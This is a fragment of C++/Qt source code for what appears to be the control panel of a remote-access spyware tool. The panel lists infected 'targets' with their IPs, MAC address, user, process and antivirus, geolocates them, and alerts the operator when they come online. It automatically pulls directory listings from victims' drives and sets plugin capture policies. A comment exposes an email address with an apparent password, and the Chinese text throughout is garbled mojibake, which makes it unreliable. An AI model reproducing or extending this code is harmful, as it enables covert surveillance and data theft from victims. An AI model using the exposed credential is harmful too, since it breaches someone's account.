	// ���� map
	g_targetMap[tar->dwTargetID] = tar;

	AddTargetNode(tar);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ŀ��״̬�ı�
//
void MainDlg::on_WM_TARGET_STATUS_CHANGE(MSG* msg)
{
	Target *tarBlock = (Target *)msg->wParam;
	assert(tarBlock);

	QTreeWidgetItem * treeNode = tarBlock->treeNode;

	if (TARONLINE == tarBlock->tarStatus)
	{
		treeNode->setText(2, QString::fromLocal8Bit("����"));

		ChangeTargetStatus(treeNode, tarBlock, true);

		// ��������˸
		if ( this->isMinimized() && !m_trayFlashTimer->isActive() )
			m_trayFlashTimer->start(300);

		// �ı���ɫ
		for (int i = 0; i < 11; i++)
		{
			treeNode->setForeground(i, QBrush(QColor(255,0,0)));
		}

		if (tarBlock->lastTime == 0)
		{

			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[Ŀ��%s(ID:%d)] ����",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);

		}
		else
		{
			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[Ŀ��%s(ID:%d)] ����",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);
		}

		if (tarBlock->frmTarControl)
		{
			if (tarBlock->frmTarControl->bShowFlag)
			{
				tarBlock->frmTarControl->TargetOnline();
			}
		}

		// ��������
		NotifyInfo info;
		info.targetID = tarBlock->dwGroupID;
		wsprintfA(info.title, "Ŀ����������[%d]", tarBlock->dwTargetID);
		wsprintfA(info.message, " Ŀ����Ϣ : \r\n Ŀ�� id : %d \r\n ���� : %s \r\n ����ϵͳ : %s \r\n �ⲿ IP : %s \r\n �ڲ� IP : %s \r\n MAC ��ַ : %s \r\n",
			tarBlock->dwTargetID, tarBlock->aniTargetName.c_str(), ConvertBuildNumberToStr(tarBlock->dwOsBuildNumber).c_str(), tarBlock->aniRemPublicIpAddr.c_str(),
			tarBlock->aniRemLocalIpAddr.c_str(), tarBlock->aniRemMacAddr.c_str());
		//OnlineNotify("sssooonnnggg111@163.com", "24yangjing", &info);

		char cfgPath[MAX_PATH] = {0};
		GetModuleFileNameA(NULL, cfgPath, MAX_PATH);
		*(strrchr(cfgPath, '\\')+1) = 0;
		strcat(cfgPath, "OnlineNotify.ini");


		if ( OnlineNotify )
			OnlineNotify(cfgPath, &info);

	}
	else
	{
		treeNode->setText(2, QString::fromLocal8Bit("����"));

		ChangeTargetStatus(treeNode, tarBlock, false);

		// �ı���ɫ
		for (int i = 0; i < 11; i++)
		{
			treeNode->setForeground(i, QBrush(QColor(0,0,0)));
		}

		/*if (tarBlock->lastTime == 0)
		{

			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[Ŀ��%s(ID:%d)] ����",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);
		}
		else
		{

			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[Ŀ��%s(ID:%d)] ����",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);
		}*/

		if (tarBlock->frmTarControl)
		{
			tarBlock->frmTarControl->TargetOffline();
		}
	}

	UpdateTargetDisplay(treeNode);

	//RefreshTargetList();
	UpateTargetCount();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����ָ���Ի�ȡĿ��Ŀ¼��Ϣ
//
void MainDlg::AutoGetDirInfo(Target* tarBlock)
{
	std::wstring path;

	if ( SYSTEM_WINDOWS == tarBlock->m_sysType )
		path = L"C:\\";
	else
		path = L"/";

	// �Զ���ȡĿ¼�ṹ
	if ( -1 != tarBlock->m_autoGetDirInfoDepth )
	{
		if ( tarBlock->tarConn )
		{       
			tarBlock->tarConn->Send_ADT( tarBlock->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(path).c_str(),
				tarBlock->m_autoGetDirInfoDepth == 0 ? 10 : tarBlock->m_autoGetDirInfoDepth,
				0);
		}

		// ��ȡһ�ξ����ˣ��ظ���ȡ�ܷ����ġ���
		tarBlock->m_autoGetDirInfoDepth = -1;
		DM->UpdateTargetAutoGetStatus(tarBlock->dwTargetID, -1);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ŀ����Ϣ����
//
void MainDlg::on_WM_TARGET_INFO_UPDATED(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	// �������ݿ�
	//
	DM->UpdateTargetInfo(tar);

	// ���½���
	//
	QTreeWidgetItem * treeNode = tar->treeNode;
	treeNode->setText(3, QString::fromLocal8Bit(ConvertBuildNumberToStr(tar->dwOsBuildNumber).c_str()));

	tar->m_sysType = GetSystemType(tar->dwOsBuildNumber);

	ChangeTargetStatus(treeNode, tar, true);

	if ( tar->aniRemPublicIpAddr != treeNode->text(4).toStdString() )
	{
		std::string Info = "Ŀ��" 
			+ tar->aniTargetName 
			+ "(ID:" 
			+ QString("%1").arg(tar->dwTargetID).toStdString()
			+ ")�ⲿIP��ַ��" 
			+ treeNode->text(4).toStdString()
			+ "��Ϊ" 
			+ tar->aniRemPublicIpAddr;
		AddStatusInfo(STATUS_NOTE, Info.c_str());

		treeNode->setText(4, tar->aniRemPublicIpAddr.c_str());
		ui.label_002_content->setText(tar->aniRemPublicIpAddr.c_str());

		std::string country, location;
		m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);

		treeNode->setText(6, QString::fromLocal8Bit(country.c_str()));
		ui.label_004_content->setText(QString::fromLocal8Bit(country.c_str()));

	}

	if ( tar->aniRemLocalIpAddr != treeNode->text(5).toStdString() )
	{
		std::string Info = "Ŀ��" 
			+ tar->aniTargetName 
			+ "(ID:" 
			+ QString("%1").arg(tar->dwTargetID).toStdString()
			+ ")�ڲ�IP��ַ��" 
			+ treeNode->text(5).toStdString()
			+ "��Ϊ" 
			+ tar->aniRemLocalIpAddr;
		AddStatusInfo(STATUS_NOTE, Info.c_str());

		treeNode->setText(5, tar->aniRemLocalIpAddr.c_str());
		ui.label_003_content->setText(tar->aniRemLocalIpAddr.c_str());
	}

	if ( tar->aniRemMacAddr != treeNode->text(6).toStdString() )
	{
		std::string Info = "Ŀ��" 
			+ tar->aniTargetName 
			+ "(ID:" 
			+ QString("%1").arg(tar->dwTargetID).toStdString()
			+ ")Mac��ַ��" 
			+ treeNode->text(9).toStdString()
			+ "��Ϊ" 
			+ tar->aniRemMacAddr;
		AddStatusInfo(STATUS_NOTE, Info.c_str());

		treeNode->setText(9, tar->aniRemMacAddr.c_str());
		ui.label_005_content->setText(tar->aniRemMacAddr.c_str());
	}

	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "��������") )
		{
			treeNode->setText(10, QString::fromLocal8Bit(szLang));
			ui.label_006_content->setText(QString::fromLocal8Bit(szLang));
		}
	}

	if ( tar->m_netEnv > 4 )
		tar->m_netEnv = 4;

	treeNode->setText(8, QString::fromStdWString(std::wstring(TargetDlg::Net_description[tar->m_netEnv])));

}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ŀ����չ��Ϣ����
//
void MainDlg::on_WM_TARGET_EXINFO_UPDATED(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	// �������ݿ�
	//
	DM->UpdateTargetExInfo(tar);

	QTreeWidgetItem * treeNode = tar->treeNode;

	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "��������") )
		{
			treeNode->setText(10, QString::fromLocal8Bit(szLang));
			ui.label_006_content->setText(QString::fromLocal8Bit(szLang));
		}
	}

	// �����ѡ�У����»�����Ϣ
	//
	if ( treeNode->isSelected() )
	{
		ui.tbBasicInfo->setItem(0, 0, new QTableWidgetItem(
			QIcon("image/unknown.png"), QString::fromLocal8Bit("״̬")));
		ui.tbBasicInfo->setItem(1, 0, new QTableWidgetItem(
			QIcon("image/disklist.png"), QString::fromLocal8Bit("������")));
		ui.tbBasicInfo->setItem(2, 0, new QTableWidgetItem(
			QIcon("image/group.png"), QString::fromLocal8Bit("��¼�û�")));
		ui.tbBasicInfo->setItem(3, 0, new QTableWidgetItem(
			QIcon("image/run.png"), QString::fromLocal8Bit("���߽���")));

		ui.tbBasicInfo->setItem(0, 1, new QTableWidgetItem(
			tar->tarStatus == TARONLINE
			? QString::fromLocal8Bit("����")
			: QString::fromLocal8Bit("����")));
		ui.tbBasicInfo->setItem(1, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64))));
		ui.tbBasicInfo->setItem(2, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
		ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
			QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));

		ui.label_007_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64)));
		ui.label_008_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64)));
		ui.label_009_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64)));
		ui.label_010_content->setText(QString::fromStdWString(tar->m_antiVirus));
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ŀ���л�
//
void MainDlg::on_WM_TARGET_SWITCH(MSG* msg)
{
	// ����ƶ���Ϣ���ݲ�����
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ŀ���������ӹر�
//
void MainDlg::on_WM_TARGET_DATACONNCLOSED(MSG* msg)
{
	Target *tarBlock = (Target *)msg->wParam;

	if ( ! this->ctrOnlineFlag)
	{
		return;
	}

	if (tarBlock->bCleared)
	{
		return;
	}

	SetStatusInfoExA(STATUS_INFO,"[Ŀ��%s(ID:%lu)] ���ݴ���ͨ���ر�",
		tarBlock->aniTargetName.c_str(), tarBlock->dwTargetID);

	if (tarBlock->bConnecting == false && tarBlock->bTarConnOnline == false )
	{
		SetStatusInfoExA(STATUS_INFO,"[Ŀ��%s(ID:%lu)] ���½������ݴ���ͨ��",
			tarBlock->aniTargetName.c_str(), tarBlock->dwTargetID);

		tarBlock->StartTarDataConn();       // ���¿�ʼ����
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��� target dialog
//
void MainDlg::on_WM_ADD_TARGET_DIALOG(MSG* msg)
{
	/*Target* tar = (Target*)msg->wParam;

	if (tar->frmTarControl == NULL )
	{
		tar->frmTarControl = new TargetDlg(tar);
		m_targetWindowList.append(tar->frmTarControl);
	}

	m_targetDlgContainer->AddDialog(
		tar->frmTarControl, tar->dwTargetID, QString::fromLocal8Bit(tar->aniTargetName.c_str()), GetIconPath(tar));
	tar->frmTarControl->SetCurrentTab(QString::fromLocal8Bit("����״̬"));
	tar->frmTarControl->Handle = (HWND)tar->frmTarControl->winId();*/
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ˫��Ŀ���б� 
//
void MainDlg::ShowTarget(QTreeWidgetItem* item, int column)
{
	//// ������Ǹ��ڵ㣬���Ŀ�괰��
	//if ( NULL != item->parent() )
	//{
		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

		if (tar->frmTarControl == NULL)
		{
			//WaitDlg* dlg = new WaitDlg(ui.trTarget);
			//dlg->SetDisplayMode(WaitDlg::TEXT);
			//dlg->SetText(QString::fromLocal8Bit("���ڳ�ʼ��Ŀ����ƽ��棬���Ժ�..."));
			//dlg->show();
			//qApp->processEvents();
			tar->frmTarControl = new TargetDlg(tar);
			connect(tar->frmTarControl, SIGNAL(emitModifyCapturePolicy(unsigned int, int)), this, SLOT(ModifyPluginPolicy(unsigned int, int)));
			//dlg->close();
			//delete dlg;
			m_targetWindowList.append(tar->frmTarControl);
		}

		//m_targetDlgContainer->AddDialog(tar->frmTarControl, tar->dwTargetID, item->text(1), GetIconPath(tar));
		//m_targetDlgContainer->SetCurrentTab(tar->dwTargetID);
		tar->frmTarControl->show();
		tar->frmTarControl->SetCurrentTab(QString::fromLocal8Bit("����״̬"));
		//m_targetDlgContainer->showNormal();
		//m_targetDlgContainer->activateWindow();

		tar->frmTarControl->Handle = (HWND)tar->frmTarControl->winId();

	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����б��е�Ŀ��
//
void MainDlg::CurrentTargetChanged(QTreeWidgetItem* item, int column)
{
	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

	QLabel* basic_info[] = {ui.label_001, ui.label_002, ui.label_003, ui.label_004, ui.label_005, ui.label_006, ui.label_007, ui.label_008, ui.label_009, ui.label_010};
	const wchar_t* basic_info_tip[] = {L"����ϵͳ", L"���� ip", L"���� ip", L"���ڵ�", L"�����ַ", 
		L"���԰汾", L"������", L"�û���", L"������", L"ɱ�����"};
	QLabel* basic_content[] = {ui.label_001_content, ui.label_002_content, ui.label_003_content, ui.label_004_content, ui.label_005_content, ui.label_006_content, ui.label_007_content, ui.label_008_content, ui.label_009_content, ui.label_010_content};

	
	ui.label_001_content->setText(QString::fromLocal8Bit(ConvertBuildNumberToStr(tar->dwOsBuildNumber).c_str()));
	ui.label_002_content->setText(tar->aniRemPublicIpAddr.c_str());
	ui.label_003_content->setText(tar->aniRemLocalIpAddr.c_str());

	std::string country, location;
	m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);

	ui.label_004_content->setText(QString::fromLocal8Bit(country.c_str()));
	ui.label_005_content->setText(tar->aniRemMacAddr.c_str());

	// ��չ��Ϣ
	if (tar->dwLangId != 0)
	{
		CHAR szLang[MAX_PATH];
		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
		if ( 0 != strcmp(szLang, "��������") )
		{
			ui.label_006_content->setText(QString::fromLocal8Bit(szLang));
		}
	}
	else
	{
		ui.label_006_content->setText(QString::fromLocal8Bit("δ֪"));
	}

	ui.label_007_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64)));
	ui.label_008_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64)));
	ui.label_009_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64)));
	ui.label_010_content->setText(QString::fromStdWString(tar->m_antiVirus));

	ui.label_10->setPixmap(QPixmap(GetIconPath(tar)));


	//ui.tbPluginStatus->clearContents();
	//ui.tbBasicInfo->clearContents();

	//if ( NULL != item->parent() )
	//{
	//	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

	//	// ֻ���ƶ��豸�ſ��Կ�������
	//	ui.actFlowControl->setEnabled(MobileDevice(tar));

	//	// �ղ�/ȡ���ղ�
	//	if ( tar->m_favorite )
	//		ui.actFavorite->setText(QString::fromLocal8Bit("ȡ���ղ�"));
	//	else
	//		ui.actFavorite->setText(QString::fromLocal8Bit("�ղ�Ŀ��"));

	//	// �������״̬
	//	//
	//	PPLUGIN_CONTEXT  lpPluginCxt;

	//	int plgCount = 0;
	//	for (int i = 1; i < MAX_PLG_COUNT; i++)
	//	{		
	//		lpPluginCxt = tar->pluginVect[i];
	//		if (lpPluginCxt == NULL)
	//		{
	//			continue;
	//		}

	//		// �ֻ�û�� usb
	//		if ( GetSystemType(tar->dwOsBuildNumber) != SYSTEM_WINDOWS 
	//			&& GetSystemType(tar->dwOsBuildNumber) != SYSTEM_MACOSX 
	//			&& i == 3 )
	//		{
	//			continue;
	//		}

	//		// ����һ��ռλ
	//		for ( int j = 0; j < 4; j++ )
	//		{
	//			ui.tbPluginStatus->setItem(plgCount, j, new QTableWidgetItem);
	//		}
	//		
	//		ui.tbPluginStatus->item(plgCount, 0)->setText(QString("%1").arg(i));
	//		ui.tbPluginStatus->item(plgCount, 1)->setText(
	//			QString::fromLocal8Bit(ConvertPluginIdToLang(i).c_str()));
	//		ui.tbPluginStatus->item(plgCount, 2)->setText(QString("%1").arg(lpPluginCxt->dwPluginVer));
	//		ui.tbPluginStatus->item(plgCount, 3)->setText(
	//			lpPluginCxt->dwPluginVer == 0
	//			? QString::fromLocal8Bit("δ����")
	//			: QString::fromLocal8Bit("������"));

	//		if ( lpPluginCxt->dwPluginVer == 0 )
	//		{
	//			ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon("image/module_disable.png"));
	//		}
	//		else
	//		{
	//			ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon("image/module.png"));
	//		}

	//		plgCount++;
	//	}

	//	// ����������Ϣ
	//	//
	//	ui.tbBasicInfo->setItem(0, 0, new QTableWidgetItem(
	//		QIcon("image/unknown.png"), QString::fromLocal8Bit("״̬")));
	//	ui.tbBasicInfo->setItem(1, 0, new QTableWidgetItem(
	//		QIcon("image/disklist.png"), QString::fromLocal8Bit("������")));
	//	ui.tbBasicInfo->setItem(2, 0, new QTableWidgetItem(
	//		QIcon("image/group.png"), QString::fromLocal8Bit("��¼�û�")));
	//	ui.tbBasicInfo->setItem(3, 0, new QTableWidgetItem(
	//		QIcon("image/run.png"), QString::fromLocal8Bit("���߽���")));
	//	ui.tbBasicInfo->setItem(4, 0, new QTableWidgetItem(
	//		QIcon("image/error.png"), QString::fromLocal8Bit("ɱ�����")));



	//	ui.tbBasicInfo->setItem(0, 1, new QTableWidgetItem(
	//		tar->tarStatus == TARONLINE
	//		? QString::fromLocal8Bit("����")
	//		: QString::fromLocal8Bit("����")));
	//	ui.tbBasicInfo->setItem(1, 1, new QTableWidgetItem(
	//		QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64))));
	//	ui.tbBasicInfo->setItem(2, 1, new QTableWidgetItem(
	//		QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
	//	ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
	//		QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));
	//	ui.tbBasicInfo->setItem(4, 1, new QTableWidgetItem(
	//		QString::fromStdWString(tar->m_antiVirus)));
	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot �б��Ҽ��˵�
//
void MainDlg::onTrTargetContextMenuActived(QPoint point)
{
	QMenu menu(this);

	QTreeWidgetItem* item = ui.trTarget->itemAt(point);

	menu.addAction(ui.actPolicy);
	menu.addAction(ui.actAlias);
	menu.addAction(ui.actClean);

	QPoint realPos = ui.trTarget->viewport()->mapToGlobal(point);
	menu.exec(realPos);

}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ���鷽ʽ�ı�
//
void MainDlg::onCmbCateGoryCurrentIndexChanged(int index)
{
	m_category = index;
	RefreshTargetList();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��ʾģʽ�ı�
//
void MainDlg::onCmbDisplayModeCurrentIndexChanged(int index)
{
	m_displayMode = index;
	RefreshTargetList();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ˢ��Ŀ���б�
//
void MainDlg::RefreshTargetList()
{
	while ( ui.trTarget->topLevelItemCount() )
	{
		QTreeWidgetItem* group = ui.trTarget->topLevelItem(0);

		while ( group->childCount() )
		{
			QTreeWidgetItem* item = group->takeChild(0);
		}

		ui.trTarget->takeTopLevelItem(0);
	}

	for ( std::list<QTreeWidgetItem*>::iterator it = m_itemList.begin();
		it != m_itemList.end();
		++it )
	{
		//AddItemByIP(*it);
		AddTargetNode(*it);
	}

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		ui.trTarget->topLevelItem(i)->setExpanded(true);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���ݷ���������ӽڵ�
//
void MainDlg::AddTargetNode(QTreeWidgetItem* item)
{
	//if ( m_category == Category::IP )
	//	AddItemByIP(item);
	//if ( m_category == Category::GROUP )
	//	AddItemByGroup(item);
	//if ( m_category == Category::PLATFORM )
	//	AddItemByPlatform(item);
	ui.trTarget->addTopLevelItem(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��������
//
void MainDlg::AddItemByGroup(QTreeWidgetItem* item)
{
	if ( !ItemCanShow(item) )
		return;

	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

	QString groupText = QString("%1").arg(tar->dwGroupID);

	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);

		if ( item->text(0) == groupText )
		{
			parent = item;
			break;
		}
	}

	if ( parent == NULL )
	{
		parent = new QTreeWidgetItem;
		parent->setIcon(0, QIcon(QPixmap("image/group.png")));
		parent->setText(0, groupText);
		ui.trTarget->addTopLevelItem(parent);
	}

	parent->addChild(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ƽ̨���
//
void MainDlg::AddItemByPlatform(QTreeWidgetItem* item)
{
	if ( !ItemCanShow(item) )
		return;

	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
	const char* caption[] = {"Windows", "Mac OS X", "IOS", "Android"};
	const char* icon[] = {
		"image/windows_online.png",
		"image/mac_online.png",
		"image/iphone_online.png",
		"image/android_online.png"
	};

	if ( tar == NULL )
		return;

	int systemType = GetSystemType(tar->dwOsBuildNumber);

	QString groupText = QString::fromLocal8Bit(caption[systemType]);

	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);

		if ( item->text(0) == groupText )
		{
			parent = item;
			break;
		}
	}

	if ( parent == NULL )
	{
		parent = new QTreeWidgetItem;
		parent->setIcon(0, QIcon(QPixmap(icon[systemType])));
		parent->setText(0, QString::fromLocal8Bit(caption[systemType]));
		ui.trTarget->addTopLevelItem(parent);
	}

	parent->addChild(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �� IP ���
//
void MainDlg::AddItemByIP(QTreeWidgetItem* item)
{
	if ( !ItemCanShow(item) )
		return;

	QString ipText = item->text(6);

	QTreeWidgetItem* parent = NULL;

	for ( int i = 0; i < ui.trTarget->topLevelItemCount(); ++i )
	{
		QTreeWidgetItem* item = ui.trTarget->topLevelItem(i);

		if ( item->text(0) == ipText )
		{
			parent = item;
			break;
		}
	}

	if ( parent == NULL )
	{
		parent = new QTreeWidgetItem;
		parent->setIcon(0, QIcon(QPixmap("image/home.png")));
		parent->setText(0, ipText);
		ui.trTarget->addTopLevelItem(parent);
	}

	parent->addChild(item);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����Ŀ������
//
void MainDlg::UpateTargetCount()
{
	int count = 0;
	int onlineCount = 0;

	for ( std::map<ULONG, Target*>::iterator it = g_targetMap.begin();
		it != g_targetMap.end();
		++it )
	{
		++count;
		Target* tar = (*it).second;
		if ( tar && tar->tarStatus == TARONLINE )
			++onlineCount;
	}

	ui.lbTargetCount->setText(QString("%1").arg(count));
	ui.lbOnlineTargetCount->setText(QString("%1").arg(onlineCount));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private item �ڵ�ǰ��ʾģʽ���Ƿ�Ӧ����ʾ
//
bool MainDlg::ItemCanShow(QTreeWidgetItem* item)
{
	if ( item == NULL )
		return false;

	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();

	if ( DisplayMode::SHOW_ALL == m_displayMode
		|| (DisplayMode::SHOW_ONLINE == m_displayMode && tar->tarStatus == TARONLINE)
		|| (DisplayMode::SHOW_OFFLINE == m_displayMode && tar->tarStatus == TAROFFLINE)
		|| (DisplayMode::SHOW_FAVORITE == m_displayMode && tar->m_favorite )
		)
	{
		return true;
	}

	return false;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ������Ӧ����
//
void MainDlg::PNGTimerTimer()
{
	// ÿ30�룬ִ��һ��
	//
	if (this->ctrConn == NULL)
	{
		return;
	}

	//
	// ������ӱ��֣�����PNG����
	//

	this->ctrConn->Send_PNG();

	std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tarBlock = (*i).second;

		if (tarBlock == NULL)
		{
			continue;
		}

		// ����ת�������յ�PND�󣬻�ת�������ߵ�Ŀ�꣬�Ӷ���֤���˵Ŀ���
		//
		if (tarBlock->bTarConnOnline && tarBlock->tarConn)
		{
			tarBlock->tarConn->Send_PNG();
		}
	}
}

///////////////////////////////////////////////////////////////////////////////////
// @private
///////////////////////////////////////////////////////////////////////////////////

// ////////////////////////////////////////////////////////////////////////////////
// @private �������΢�� 
//
void MainDlg::InitWidgetAppearance()
{

	setContextMenuPolicy(Qt::NoContextMenu);

	// ����
	std::wstring inifile = GetExePath()+L"\\setting.ini";
	std::wstring title = ReadStringPolicyFromLocal(L"Application", L"title", inifile.c_str());
	this->setWindowTitle(QString::fromStdWString(title));

	// ������
	ui.mainToolBar->setMinimumHeight(80);
	ui.mainToolBar->setStyleSheet(GetStylesheetFromFile(L"toolbar"));

	// �˵���
	ui.menuBar->setStyleSheet(GetStylesheetFromFile(L"menu"));

	// ״̬��
	ui.statusBar->setStyleSheet(GetStylesheetFromFile(L"statusbar"));

	// ������Ϣ��ͷ����
	ui.tbBasicInfo->setStyle(new NoFocusStyle(this));
	ui.tbBasicInfo->horizontalHeader()->resizeSection(0, 100);

	// ���״̬��ͷ����
	ui.tbPluginStatus->setStyle(new NoFocusStyle(this));
	//ui.tbBasicInfo->horizontalHeader()->setResizeMode(QHeaderView::ResizeToContents);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(0, 50);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(1, 110);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(2, 50);
	ui.tbPluginStatus->horizontalHeader()->resizeSection(3, 35);
	ui.tbPluginStatus->horizontalHeader()->setDefaultAlignment(Qt::AlignLeft | Qt::AlignVCenter);

	// ��־��ͷ����
	//ui.tbLog->horizontalHeader()->resizeSection(0, 250);

	// Ŀ���б��ͷ����
	ui.trTarget->header()->resizeSection(0, 150);
	ui.trTarget->header()->resizeSection(1, 100);
	ui.trTarget->header()->resizeSection(2, 50);
	ui.trTarget->header()->resizeSection(3, 100);
	ui.trTarget->header()->resizeSection(4, 100);
	ui.trTarget->header()->resizeSection(5, 100);
	ui.trTarget->header()->resizeSection(6, 100);
	ui.trTarget->header()->resizeSection(7, 70);
	ui.trTarget->header()->resizeSection(8, 70);
	ui.trTarget->header()->resizeSection(9, 120);
	ui.trTarget->header()->resizeSection(10, 100);
	ui.trTarget->header()->resizeSection(11, 30);

	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);

	ui.cmbCategory->setStyle(nofocusStyle);
	ui.cmbDisplayMode->setStyle(nofocusStyle);
	ui.menuBar->setStyle(nofocusStyle);

	ui.menuBar->hide();
	ui.mainToolBar->hide();
	ui.statusBar->hide();

	ui.frame_target_info->hide();
	ui.pluginStatus->hide();
	ui.displayMode->hide();
	ui.trTarget->header()->setVisible(false);

	for ( int i = 1; i < ui.trTarget->columnCount(); ++i )
	{
		ui.trTarget->hideColumn(i);
	}

	QLabel* basic_info[] = {ui.label_001, ui.label_002, ui.label_003, ui.label_004, ui.label_005, ui.label_006, ui.label_007, ui.label_008, ui.label_009, ui.label_010};
	const wchar_t* basic_info_tip[] = {L"����ϵͳ", L"���� ip", L"���� ip", L"���ڵ�", L"�����ַ", L"���԰汾", L"������", L"�û���", L"������", L"ɱ�����"};
	QLabel* basic_content[] = {ui.label_001_content, ui.label_002_content, ui.label_003_content, ui.label_004_content, ui.label_005_content, ui.label_006_content, ui.label_007_content, ui.label_008_content, ui.label_009_content, ui.label_010_content};

	for ( int i = 0; i < sizeof(basic_info) / sizeof(QLabel*); ++i )
	{
		basic_info[i]->setText(QString::fromStdWString(std::wstring(basic_info_tip[i])));
		basic_info[i]->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
		basic_info[i]->setStyleSheet("QLabel{font-family:'Microsoft Yahei';font-weight:bold;font-size:12px;margin-right:20px;min-width:120px;}");
		basic_content[i]->setText(QString::fromLocal8Bit("δ֪"));
		basic_content[i]->setStyleSheet("QLabel{font-family:'Microsoft Yahei';font-size:12px;min-width:100px;}");
	}

	ui.label_10->setScaledContents(true);
	ui.label_10->setFixedSize(150, 150);
	ui.label_10->setText("");
	ui.label_10->setPixmap(QPixmap("image/android_offline.png"));
	ui.edtLog->setStyleSheet("QTextEdit{background-color:white;font-family:'Microsoft Yahei';font-size:12px;padding:5px;}");
	ui.trTarget->setMinimumWidth(200);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ���ź���۵����� 
//
void MainDlg::InitConnection()
{
	connect(m_targetDlgContainer, SIGNAL(emitBack()), this, SLOT(ActiveMainWindow()));

	// Action
	connect(ui.actStart, SIGNAL(triggered()), this, SLOT(StartAction()));
	connect(ui.actStop, SIGNAL(triggered()), this, SLOT(StopAction()));
	connect(ui.actExit, SIGNAL(triggered()), this, SLOT(ExitAction()));
	connect(ui.actConfig, SIGNAL(triggered()),this, SLOT(ConfigAction()));
	connect(ui.actPolicy, SIGNAL(triggered()), this, SLOT(PolicyAction()));
	connect(ui.actFavorite, SIGNAL(triggered()), this, SLOT(FavoriteAction()));
	connect(ui.actAlias, SIGNAL(triggered()),this, SLOT(AliasAction()));
	connect(ui.actDelSelf, SIGNAL(triggered()), this, SLOT(DelSelfAction()));
	connect(ui.actFlowControl, SIGNAL(triggered()), this, SLOT(FlowControlAction()));
	connect(ui.actClean, SIGNAL(triggered()), this, SLOT(CleanAction()));
	connect(ui.actCreate, SIGNAL(triggered()), this, SLOT(CreateTargetAction()));
	connect(ui.actCreateDaemon, SIGNAL(triggered()), this, SLOT(CreateDaemonAction()));
	connect(ui.actHelp, SIGNAL(triggered()), this, SLOT(HelpAction()));
